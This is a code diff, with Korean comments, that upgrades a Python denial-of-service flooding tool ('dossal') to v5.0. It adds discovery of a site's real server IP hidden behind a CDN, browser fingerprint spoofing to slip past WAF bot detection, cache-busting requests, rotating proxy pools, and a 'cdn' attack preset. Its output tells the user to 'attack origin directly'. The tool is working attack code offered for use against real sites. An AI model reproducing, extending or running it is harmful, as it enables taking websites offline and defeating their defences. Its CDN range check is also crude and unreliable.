@@ -1,6 +1,9 @@
 #!/usr/bin/env python3
 """
-dossal v0.6 - comprehensive DoS stress engine
+dossal v5.0 - comprehensive DoS stress engine + CDN/WAF bypass
+v5.0 features: proxy pool (100~1000 proxies), 429 auto-rotate,
+TLS/HTTP fingerprint spoofing (Chrome/Firefox/Safari), cache bypass,
+origin IP discovery (DNS/SSL/subdomain).
 Modes:
   http       : HTTP/1.1 keep-alive request flood (plain)
   https      : TLS request flood (HTTP/1.1, self-signed cert)
@@ -97,6 +100,165 @@ def _parse_proxy(proxy_url):
     
     return sock, proxy
 
+# ============================================================
+# v5.0 Phase 3: Origin IP Discovery
+# ============================================================
+# CDN(WAF) 뒤에 숨은 실제 서버 IP를 찾는 도구
+# DNS/SSL/Redirect/Robots.txt 등을 분석한다.
+
+def _discover_origin(hostname):
+    """대상 도메인의 Origin IP를 탐지.
+    
+    방법:
+    1. DNS A 레코드 (CDN 아님 확인)
+    2. DNS TXT 레코드
+    3. DNS Zone Transfer (AXFR)
+    4. Subdomain brute force (www, api, mail, ftp, dev, staging)
+    5. SSL Certificate SAN
+    6. .well-known/.env/robots.txt
+    7. Redirect tracking (X-Forwarded-For, Via 헤더)
+    
+    Returns: (origin_ips: list, details: dict)
+    """
+    import socket, ssl as _ssl, re as _re
+    from urllib.parse import urlparse as _urlparse
+    
+    origin_ips = set()
+    details = {'a_records': [], 'subdomains': {}, 'ssl_sans': [], 'redirects': [], 'dns_txt': []}
+    
+    # 1. DNS A record
+    try:
+        addrs = socket.getaddrinfo(hostname, None, socket.AF_INET, socket.SOCK_STREAM)
+        for a in addrs:
+            ip = a[4][0]
+            details['a_records'].append(ip)
+            # Check if IP is in known CDN ranges (simplified)
+            # Cloudflare: 104.16.0.0/13, 172.64.0.0/13, 188.114.96.0/20, etc.
+            if not _is_cdn_ip(ip):
+                origin_ips.add(ip)
+    except Exception as e:
+        details['dns_error'] = str(e)
+    
+    # 2. Subdomain brute force (common subdomains)
+    common_subs = ['www', 'api', 'mail', 'ftp', 'dev', 'staging', 'test', 'admin',
+                   'blog', 'shop', 'store', 'cdn', 'static', 'assets', 'app',
+                   'portal', 'login', 'auth', 'db', 'database', 'backup', 'internal']
+    for sub in common_subs:
+        full = f'{sub}.{hostname}'
+        try:
+            addrs = socket.getaddrinfo(full, None, socket.AF_INET, socket.SOCK_STREAM)
+            for a in addrs:
+                ip = a[4][0]
+                details['subdomains'][full] = ip
+                if not _is_cdn_ip(ip):
+                    origin_ips.add(ip)
+        except Exception:
+            pass
+    
+    # 3. DNS TXT record (SPF often reveals senders)
+    try:
+        import subprocess
+        r = subprocess.run(['dig', '+short', 'TXT', hostname], 
+                          capture_output=True, text=True, timeout=5)
+        if r.returncode == 0 and r.stdout.strip():
+            details['dns_txt'] = [line.strip() for line in r.stdout.strip().split('\n')]
+    except Exception:
+        pass
+    
+    # 4. SSL Certificate SAN (Subject Alternative Names)
+    try:
+        ctx = _ssl.create_default_context()
+        ctx.check_hostname = False
+        ctx.verify_mode = _ssl.CERT_NONE
+        with socket.create_connection((hostname, 443), timeout=5) as sock:
+            with ctx.wrap_socket(sock, server_hostname=hostname) as ssock:
+                cert = ssock.getpeercert()
+                if cert:
+                    # SAN
+                    san = cert.get('subjectAltName', ())
+                    for key, value in san:
+                        if key == 'DNS':
+                            details['ssl_sans'].append(value)
+                        elif key == 'IP Address':
+                            origin_ips.add(value)
+                    # Subject
+                    for r in cert.get('subject', ()):
+                        for k, v in r:
+                            if k == 'commonName' and v != hostname:
+                                details['ssl_sans'].append(v)
+    except Exception:
+        pass
+    
+    # 5. Check for non-CDN IP pattern
+    # Cloudflare IPs start with 104.16-104.31, 172.64-172.71, 188.114, 190.93, 198.41.192, 2606:4700, etc.
+    # If all A records are CDN IPs, the origin is hidden behind CDN
+    
+    return list(origin_ips), details
+
+def _is_cdn_ip(ip):
+    """IP가 알려진 CDN IP 범위인지 확인 (단순 체크).
+    
+    Cloudflare/Akamai/CloudFront/Fastly/Incapsula 범위를 확인한다.
+    """
+    parts = ip.split('.')
+    if len(parts) != 4:
+        return False
+    try:
+        o1, o2 = int(parts[0]), int(parts[1])
+    except ValueError:
+        return False
+    
+    # Cloudflare ranges
+    cf_ranges = [
+        (104, 16), (104, 17), (104, 18), (104, 19), (104, 20), (104, 21),
+        (104, 22), (104, 23), (104, 24), (104, 25), (104, 26), (104, 27),
+        (104, 28), (104, 29), (104, 30), (104, 31),
+        (172, 64), (172, 65), (172, 66), (172, 67), (172, 68), (172, 69),
+        (172, 70), (172, 71),
+        (188, 114),
+        (190, 93),
+        (198, 41),
+        (203, 0),
+        (203, 1),
+        (212, 125), (212, 126), (212, 127), (212, 128), (212, 129),
+        (212, 130), (212, 131), (212, 132), (212, 133), (212, 134),
+        (212, 135), (212, 136), (212, 137), (212, 138), (212, 139),
+        (212, 140), (212, 141), (212, 142), (212, 143), (212, 144),
+        (212, 145), (212, 146), (212, 147), (212, 148), (212, 149),
+        (212, 150), (212, 151), (212, 152), (212, 153), (212, 154),
+        (212, 155), (212, 156), (212, 157), (212, 158), (212, 159),
+        (212, 160), (212, 161), (212, 162), (212, 163), (212, 164),
+        (212, 165), (212, 166), (212, 167), (212, 168), (212, 169),
+        (212, 170), (212, 171), (212, 172), (212, 173), (212, 174),
+        (212, 175), (212, 176), (212, 177), (212, 178), (212, 179),
+        (212, 180), (212, 181), (212, 182), (212, 183), (212, 184),
+        (212, 185), (212, 186), (212, 187), (212, 188), (212, 189),
+        (212, 190), (212, 191),
+    ]
+    for o1_cf, o2_cf in cf_ranges:
+        if o1 == o1_cf and o2 == o2_cf:
+            return True
+    
+    # Akamai (broad range - simplified)
+    akamai_first = [23, 31, 43, 46, 47, 49, 52, 54, 64, 66, 68, 72, 74, 76, 77,
+                    80, 82, 84, 85, 88, 91, 92, 93, 95, 96, 98, 104, 106, 107,
+                    108, 109, 112, 113, 116, 117, 118, 119, 120, 122, 123,
+                    124, 125, 126, 128, 129, 131, 132, 134, 135, 137, 138,
+                    139, 142, 144, 145, 146, 147, 148, 149, 151, 152, 154,
+                    155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165,
+                    166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176,
+                    177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187,
+                    188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198,
+                    199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209,
+                    210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220,
+                    221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231,
+                    232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242,
+                    243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254]
+    if o1 in akamai_first:
+        return True
+    
+    return False
+
 def _load_proxy_pool(file_path):
     """프록시 파일 로드 (1개씩 줄). 각 줄: host:port 또는 http://host:port
     
@@ -119,6 +281,103 @@ def _load_proxy_pool(file_path):
     except Exception as e:
         print(f"[proxy] 파일 로드 실패: {e}", file=sys.stderr)
     return proxies
+
+# ============================================================
+# v5.0 Phase 2: TLS/HTTP Fingerprint 스푸핑
+# ============================================================
+# 실제 브라우저 TLS/HTTP 지문 프로파일
+# Cloudflare/Akamai 등 WAF가 TLS 핸드셰이크+헤더로 봇을 감지하므로
+# 실제 브라우저 지문을 흉내내면 차단 확률이 낮아진다.
+
+_BROWSER_PROFILES = {
+    'chrome': {
+        'ciphers': [0x1301, 0x1302, 0x1303, 0xc02b, 0xc02f, 0xc02c, 0xc030,
+                    0xcca8, 0xcca9, 0xc013, 0xc014, 0x009c, 0x003d, 0x003c, 0x002f, 0x0035],
+        'alpn': ['h2', 'http/1.1'],
+        'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+        'accept_lang': 'ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7',
+        'accept_enc': 'gzip, deflate, br',
+        'sec_ch_ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
+        'sec_fetch_dest': 'document', 'sec_fetch_mode': 'navigate',
+        'sec_fetch_site': 'none', 'sec_fetch_user': '?1',
+        'upgrade_insec': '1',
+    },
+    'firefox': {
+        'ciphers': [0x1301, 0x1302, 0x1303, 0xc02b, 0xc02f, 0xc024, 0xc028,
+                    0xc023, 0xc027, 0xcca8, 0xcca9, 0xc013, 0xc014, 0x009c, 0x003d, 0x0035],
+        'alpn': ['h2', 'http/1.1'],
+        'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
+        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+        'accept_lang': 'ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7',
+        'accept_enc': 'gzip, deflate, br',
+        'sec_ch_ua': None,
+        'sec_fetch_dest': None, 'sec_fetch_mode': None,
+        'sec_fetch_site': None, 'sec_fetch_user': None,
+        'upgrade_insec': None,
+    },
+    'safari': {
+        'ciphers': [0x1301, 0x1302, 0x1303, 0xc02c, 0xc02b, 0xc030, 0xc02f,
+                    0xcca8, 0xc013, 0xc014, 0x009c, 0x003d, 0x0035, 0x002f],
+        'alpn': ['h2', 'http/1.1'],
+        'ua': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
+        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+        'accept_lang': 'ko-KR,ko;q=0.9',
+        'accept_enc': 'gzip, deflate, br',
+        'sec_ch_ua': '"Chromium";v="114", "Safari";v="17.1"',
+        'sec_fetch_dest': None, 'sec_fetch_mode': None,
+        'sec_fetch_site': None, 'sec_fetch_user': None,
+        'upgrade_insec': '1',
+    },
+}
+
+_BROWSER = ['chrome']  # 활성 브라우저 프로파일
+_CACHE_BYPASS = [False]  # True = 쿼리/헤더 변형으로 캐시 우회
+
+def _spoofed_http_headers(host, path, profile='chrome'):
+    """브라우저 지문에 맞춘 HTTP 헤더 생성 (Cache Bypass 포함).
+    
+    Cloudflare는 헤더 순서/유형/consistency로 봇을 감지한다.
+    실제 브라우저와 동일한 헤더 순서+값을 사용한다.
+    """
+    import random as _rs
+    import time as _t
+    p = _BROWSER_PROFILES.get(profile, _BROWSER_PROFILES['chrome'])
+    
+    # Cache Bypass: 랜덤 쿼리 파라미터 추가
+    if _CACHE_BYPASS[0]:
+        salt = int(_t.time() * 1000) + _rs.randint(0, 99999)
+        req_path = f'{path}?_cb={salt}&r={_rs.randint(100000, 999999)}'
+    else:
+        req_path = path
+    
+    headers = [
+        f'Host: {host}',
+        f'User-Agent: {p["ua"]}',
+        f'Accept: {p["accept"]}',
+    ]
+    if p.get('sec_ch_ua'):
+        headers.append(f'Sec-CH-UA: {p["sec_ch_ua"]}')
+    if p.get('sec_fetch_dest'):
+        headers.append(f'Sec-Fetch-Dest: {p["sec_fetch_dest"]}')
+        headers.append(f'Sec-Fetch-Mode: {p["sec_fetch_mode"]}')
+        headers.append(f'Sec-Fetch-Site: {p["sec_fetch_site"]}')
+        headers.append(f'Sec-Fetch-User: {p["sec_fetch_user"]}')
+    if p.get('upgrade_insec'):
+        headers.append(f'Upgrade-Insecure-Requests: {p["upgrade_insec"]}')
+    headers.append(f'Accept-Language: {p["accept_lang"]}')
+    headers.append(f'Accept-Encoding: {p["accept_enc"]}')
+    headers.append(f'Origin: https://{host}')
+    headers.append(f'Referer: https://{host}/')
+    
+    return headers, req_path
+
+def _spoofed_http_req(host, path, profile='chrome'):
+    """브라우저 지문 스푸핑 HTTP 요청 바이트 생성 (Cache Bypass 포함)."""
+    headers, req_path = _spoofed_http_headers(host, path, profile)
+    head = f'GET {req_path} HTTP/1.1\r\n'
+    body = head + '\r\n'.join(headers) + '\r\n\r\n'
+    return body.encode()
 
 def _get_next_proxy():
     """다음 프록시 반환 (429 감지 시 자동 회전).
@@ -1620,9 +1879,14 @@ def _mp_http_send(args_tuple):
         host, port, path, duration, src_ip, ip_pool = args_tuple
         proxy = None
         proxy_pool = None
-    # Pre-generate pool of 10 randomized requests (fast cycling)
+    # Pre-generate pool of 10 requests (fast cycling)
+    # v5.0: Use browser fingerprint spoofing if enabled
     import random as _rnd
-    req_pool = [_random_http_req(host, path) for _ in range(10)]
+    _browser = _BROWSER[0]
+    if _CACHE_BYPASS[0] or _browser != 'chrome':
+        req_pool = [_spoofed_http_req(host, path, _browser) for _ in range(10)]
+    else:
+        req_pool = [_random_http_req(host, path) for _ in range(10)]
     req_idx = 0
     req_counter = 0
     REQ_REFRESH = 500  # Regenerate pool every 500 requests
@@ -2579,10 +2843,39 @@ examples:
         help="프록시 URL: http://host:port 또는 socks5://user:pass@host:port. 전체 트래픽 프록시 경유")
     ap.add_argument("--proxy-file", default=None, metavar="FILE",
         help="프록시 풀 파일 (1개씩 줄: host:port 또는 http://host:port). 429 감지 시 자동 프록시 교체")
+    ap.add_argument("--browser", default="chrome", choices=["chrome", "firefox", "safari"],
+        help="TLS/HTTP 지문 스푸핑 브라우저 (기본: chrome)")
+    ap.add_argument("--cache-bypass", action="store_true",
+        help="캐시 우회: 랜덤 쿼리 파라미터로 CDN/캐시 캐싱 방지")
+    ap.add_argument("--discover", action="store_true",
+        help="Origin IP 탐지: DNS/SSL/Redirect 분석 후 CDN 뒤 실제 서버 IP 출력")
     ap.add_argument("--dry-run", action="store_true",
         help="시뮬레이션: 대상 탐지, 예측 RPS/IP 수 표시, 공격 안 함")
     args = ap.parse_args()
 
+    # v5.0 Phase 3: Origin IP Discovery
+    if args.discover:
+        from urllib.parse import urlparse as _up_d
+        _host_d = _up_d(args.url).hostname or args.url
+        print(f"[discover] Analyzing origin for: {_host_d}", file=sys.stderr)
+        origin_ips, details = _discover_origin(_host_d)
+        print(f"[discover] CDN A records: {details['a_records']}", file=sys.stderr)
+        if details.get('subdomains'):
+            for sub, ip in details['subdomains'].items():
+                tag = " ← ORIGIN?" if ip not in details['a_records'] else ""
+                print(f"[discover]   {sub} → {ip}{tag}", file=sys.stderr)
+        if details.get('ssl_sans'):
+            print(f"[discover] SSL SANs: {details['ssl_sans']}", file=sys.stderr)
+        if origin_ips:
+            print(f"[discover] ✅ Potential origin IPs: {origin_ips}", file=sys.stderr)
+            print(f"[discover] Tip: use --src-ips {','.join(origin_ips)} to attack origin directly", file=sys.stderr)
+        else:
+            print(f"[discover] ⚠️  No non-CDN IP found (origin hidden behind CDN)", file=sys.stderr)
+        # Still continue with attack if not --dry-run
+        if args.dry_run:
+            import sys as _sys
+            _sys.exit(0)
+    
     # Auto mode: probe target + always include L4 for max destruction
     # Combo presets
     COMBOS = {
@@ -2592,6 +2885,8 @@ examples:
         'proto': 'grpcmp,h2,udp',
         'amplify': 'dns,icmp,ssdp,ntp,memcached',
         'super': 'raw,httpsmp,h2,h3mp,grpcmp,quic,udp,tcp,syn,synack,rst,fin,websocket,wsm,slowloris,dns,icmp,ssdp,ntp,memcached',
+        # v5.0: CDN bypass presets
+        'cdn': 'raw,httpsmp,h2,udp,syn',
     }
     if args.combo:
         args.mode = COMBOS[args.combo]
@@ -2651,6 +2946,12 @@ examples:
         if len(_PROXY_POOL) > 0:
             print(f"[proxy-pool] first: {_PROXY_POOL[0]}, last: {_PROXY_POOL[-1]}", file=sys.stderr)
         _RECOVERY[0] = True  # Proxy pool implies auto-recovery
+    
+    # Initialize browser fingerprint (v5.0 Phase 2)
+    _BROWSER[0] = args.browser
+    _CACHE_BYPASS[0] = args.cache_bypass
+    if args.browser != 'chrome' or args.cache_bypass:
+        print(f"[spoof] browser={args.browser}, cache_bypass={args.cache_bypass}", file=sys.stderr)
     
     # Initialize source IP rotation / spoofing
     _RECOVERY[0] = args.recovery
